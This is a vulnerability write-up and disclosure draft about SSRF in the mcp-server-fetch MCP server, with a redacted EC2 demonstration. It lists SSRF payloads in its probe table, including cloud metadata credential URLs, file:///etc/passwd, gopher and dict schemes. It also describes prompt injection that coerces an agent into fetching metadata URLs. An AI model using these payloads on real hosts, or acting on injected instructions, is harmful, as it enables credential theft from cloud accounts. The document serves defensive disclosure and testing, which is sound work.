# MCP-D-003 vs mcp-server-fetch — environment-dependent SSRF

**Date:** 2026-05-11
**Target:** `mcp-server-fetch` v2025.4.7 (PyPI)
**Tested by:** [scenarios/MCP-D-003-ssrf-url-fetcher.yaml](../scenarios/MCP-D-003-ssrf-url-fetcher.yaml)
**Agent driver:** n/a (direct mode — harness as MCP client)
**Outcome:** **VULNERABILITY (demonstrated on EC2 and disclosed 2026-05-12)** — high on cloud-hosted agent hosts running IMDSv1 or IMDSv2-Optional; mitigated by IMDSv2-Required (Amazon Linux 2023 default since 2024). Coordinated disclosure filed as [modelcontextprotocol/servers#4143](https://github.com/modelcontextprotocol/servers/issues/4143). Embargo: 2026-08-10.

## Result

`mcp-server-fetch` has no explicit SSRF protection — no scheme allowlist, no host denylist for link-local / RFC 1918 / loopback. The only accidental defense is its robots.txt-fetch-first behavior, which causes the main fetch to abort when robots.txt can't be reached. **This defense fails on any host that responds to TCP, including the AWS / GCP / Azure metadata services.**

## Reproduction

```bash
# Direct probe — exits non-zero when oracle fires:
mcp-scan-test scenarios/MCP-D-003-ssrf-url-fetcher.yaml \
    --server-cmd python --server-arg=-m --server-arg=mcp_server_fetch
```

JSON output:

```json
{
  "scenario_id": "MCP-D-003",
  "passed": false,
  "oracle_evidence": ["canary_hit:ssrf_canary:hits=1"],
  "skipped_steps": [],
  "error": null
}
```

## Detailed probe (what's actually happening)

Per-payload behavior observed on a macOS dev machine (no AWS metadata reachable):

| Payload | Response | Why |
|---|---|---|
| `http://127.0.0.1:<port>/<token>/probe` (canary) | succeeded — canary recorded hit | aiohttp returned HTTP 404 for `/robots.txt`, which fetch treated as a successful robots.txt fetch, so the real URL was then fetched |
| `http://169.254.169.254/latest/meta-data/` (AWS IMDS) | `"Failed to fetch robots.txt http://169.254.169.254/robots.txt due to a connection issue"` | link-local TCP unreachable from a non-EC2 host |
| `http://169.254.170.2/v2/credentials/` (ECS) | same | same |
| `http://metadata.google.internal/computeMetadata/v1/` (GCP) | same | same |
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure) | same | same |
| `http://127.0.0.1:22` (SSH) | "Failed to fetch robots.txt" | port 22 has no HTTP server |
| `http://[::1]:22` | same | same |
| `http://0.0.0.0:6379/` (Redis) | same | port 6379 has no HTTP server |
| `file:///etc/passwd` | "Failed to fetch robots.txt file:///robots.txt due to a connection issue" | file:// scheme has no concept of robots.txt |
| `file:///etc/hostname` | same | same |
| `gopher://127.0.0.1:6379/_PING%0d%0a` | empty response | scheme not supported |
| `dict://127.0.0.1:11211/stat` | empty response | scheme not supported |

## The actual vulnerability

The behavior pattern decomposes as:

1. fetch makes a `GET /robots.txt` to the target host *before* the main fetch.
2. If that GET succeeds (any HTTP response, including 404), fetch proceeds to fetch the requested URL.
3. If that GET fails at the network layer (timeout, connection refused, unsupported scheme), fetch aborts and returns a "Failed to fetch robots.txt..." error.

The accidental SSRF defense works only for hosts that don't respond to TCP. On an actual EC2 instance:

```
GET /robots.txt → http://169.254.169.254/robots.txt
  ↳ IMDS responds (200 with empty body, or 404 — doesn't matter)
fetch proceeds to:
GET /latest/meta-data/iam/security-credentials/<role>/
  ↳ Returns IAM credentials in plaintext
```

The same applies to GCP `metadata.google.internal`, Azure IMDS, and any internal HTTP service that's reachable from the host running `mcp-server-fetch`.

The `--ignore-robots-txt` CLI flag on `mcp-server-fetch` explicitly disables the robots.txt check, removing the accidental defense entirely. A server administrator who enables this flag (legitimate use case: scraping sites with broken robots.txt) has zero SSRF protection.

## Why this matters

`mcp-server-fetch` is a reference Anthropic-published Python MCP server, listed in the official `modelcontextprotocol/servers` repository. Any user deploying it on a cloud-hosted agent host (e.g., a Claude Desktop running inside an EC2 instance, or an automated agent runner in a cloud VM) is potentially exposed to metadata-service credential exfiltration if their agent can be coerced into calling `fetch` with a metadata URL — which is exactly the threat that description-injection scenarios like MCP-D-001 and MCP-D-006 probe.

Defense-in-depth would require:
- Explicit scheme allowlist (e.g. `http://` and `https://` only)
- Host denylist or RFC-compliant reserved-range rejection (link-local `169.254/16`, ULA `fc00::/7`, loopback `127/8`, `::1`, RFC 1918 `10/8` `172.16/12` `192.168/16`, multicast)
- Explicit non-bypassable behavior (don't rely on robots.txt fetch failing)

## Interpretation

This finding is **environment-dependent**:

- **Local dev / non-cloud deployment:** essentially not exploitable. Metadata services aren't reachable; the robots.txt defense holds.
- **Cloud deployment (EC2, GCE, Azure VM, ECS, k8s with metadata expose):** **high severity**. Combined with a successful description-injection attack on the agent, an attacker can extract IAM/GCP/Azure credentials.
- **Cloud deployment with `--ignore-robots-txt`:** **high severity** even without metadata services in scope, because internal services are now freely reachable.

## Reproduction on EC2 (2026-05-12)

- **Instance type:** `t3.micro` (Amazon Linux 2023 AMI, region us-east-1)
- **IAM role attached:** `mcp-scan-ssrf-test-role` with `AmazonEC2ReadOnlyAccess`
- **Instance metadata options:** IMDSv2 changed from `Required` (AL2023 default) to `Optional` to allow IMDSv1 calls, since `mcp-server-fetch` does not send an `X-aws-ec2-metadata-token` header.
- **Verification command (run inside the instance):** `python3.11 ssrf_demo.py` — script is the one in [docs/audit-runbook-ec2-ssrf-verification.md](../docs/audit-runbook-ec2-ssrf-verification.md) §Part 7.

Redacted output:

```
--- calling fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/mcp-scan-ssrf-test-role/') ---

Content type text/plain cannot be simplified to markdown, but here is the raw content:
Contents of http://169.254.169.254/latest/meta-data/iam/security-credentials/mcp-scan-ssrf-test-role/:
{
  "Code" : "Success",
  "LastUpdated" : "2026-05-12T...",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA****",
  "SecretAccessKey" : "wJal****",
  "Token" : "AQoD****",
  "Expiration" : "2026-05-12T..."
}
```

The `mcp-server-fetch` package returned a valid AWS IAM credential triplet for the attached role when given the IMDS URL. Unredacted output retained locally for evidence; not committed to the repo.

Instance and IAM role were terminated immediately after capture; demonstrated credentials expired within their normal lifetime.

## Mitigations and applicability

- **IMDSv2-Required mitigates this fully.** AL2023 instances launched with default metadata options (2024-present) require an `X-aws-ec2-metadata-token` header on every IMDS request; `mcp-server-fetch` doesn't send one, so the IMDS responds 401 and no credentials are leaked. The vulnerability remains exploitable on:
  - Instances explicitly configured with `HttpTokens=optional` (or running pre-2024 AL2023 defaults)
  - Instances launched from older AMIs (AL2, custom images) where IMDSv1 was default
  - Non-AWS cloud metadata services (GCP `metadata.google.internal`, Azure IMDS) which have different default protections
  - Internal HTTP services reachable from the agent host (RFC 1918 ranges, Kubernetes API on `kubernetes.default`, etc.)
- **Defense-in-depth recommendation for the package:** add explicit scheme allowlist + RFC-reserved-range host denylist *in `mcp-server-fetch` itself*, applied before any HTTP request. Don't rely on host-level IMDSv2 enforcement — a coding-assistant or browser-automation MCP host won't always be on AL2023.

## Caveats

- **The dev-machine test is misleading on its own.** The `canary_hit` oracle firing is necessary but not sufficient to claim SSRF — it just proves the tool makes HTTP requests, which is its job. The full finding requires understanding the robots.txt gating behavior, which our trace inspection revealed.
- **D-003 scenario design has a related weakness.** A `canary_hit` against a fetch-purpose tool is ambiguous (could be benign). [MCP-D-007](../scenarios/MCP-D-007-cloud-metadata-exfil.yaml) was added afterward with a strict oracle that only fires on metadata-shaped response content.

## Suggested follow-up

1. Reproduce on a real EC2 instance — spin up a t3.micro, install `mcp-server-fetch`, run the scenario. Expected: trace contains `ami-id` / `AccessKeyId` and the oracle's pattern check fires.
2. Test against an internal HTTP service that responds to robots.txt (e.g., a simple HTTP server on `127.0.0.1:8080` returning 200 for `/robots.txt`). Expected: fetch proceeds and exposes the internal service.
3. Write a more rigorous D-007 scenario specifically for "cloud metadata exfiltration" with stricter oracle.
4. Refine D-003 to disambiguate "egress" from "harmful egress" — possibly by adding `must_be_outside_allowlist: true` on the canary, or by requiring BOTH `canary_hit` AND `trace_contains` in `all_of`.

## Disclosure

This warrants coordinated disclosure to the `modelcontextprotocol/servers` maintainers. Suggested timeline:

1. **Now:** open a GitHub issue (or email security contact if listed) describing the behavior pattern, with EC2-reproduction once obtained.
2. **+30 days:** if no response, escalate / publish.
3. **+90 days:** publish regardless of fix status.

Draft disclosure summary:

> mcp-server-fetch v2025.4.7 has no explicit SSRF protection. The implicit robots.txt-first defense fails open when the target host responds to TCP, including cloud metadata services (169.254.169.254, metadata.google.internal, Azure IMDS). On any cloud-deployed agent host, this enables credential exfiltration via prompt injection that coerces the agent into calling fetch with a metadata URL. Recommend: explicit scheme allowlist + reserved-range host denylist, applied before the robots.txt fetch.
